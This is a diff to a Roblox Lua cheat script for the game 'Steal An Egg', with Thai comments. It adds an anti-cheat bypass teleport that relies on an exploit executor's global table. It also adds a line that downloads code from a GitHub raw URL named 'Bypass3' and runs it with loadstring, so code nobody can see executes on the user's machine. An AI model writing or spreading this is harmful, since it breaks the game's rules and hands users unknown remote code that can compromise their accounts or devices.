@@ -1,3 +1,15 @@
+-- ใน Phase 1 movement:
+local function bypassTeleport(targetPos)
+    if getgenv and getgenv().BAC and getgenv().BAC.teleport then
+        return getgenv().BAC.teleport(targetPos)
+    end
+    -- fallback: ปลอดภัยกว่า
+    return safeMoveTo(targetPos, { timeout = 5 })
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aslamdunk7/paypmboygang/refs/heads/main/Bypass3"))()
+task.wait(5)
+
 -- ======================================================================================
 -- [[ OBSIDIAN GLASSMORPHIC 2 UI ENGINE - เก็บไข่ไปกับพยอมบอย ]]
 -- Master UI Spec & Full Automation Engine for Roblox Steal An Egg
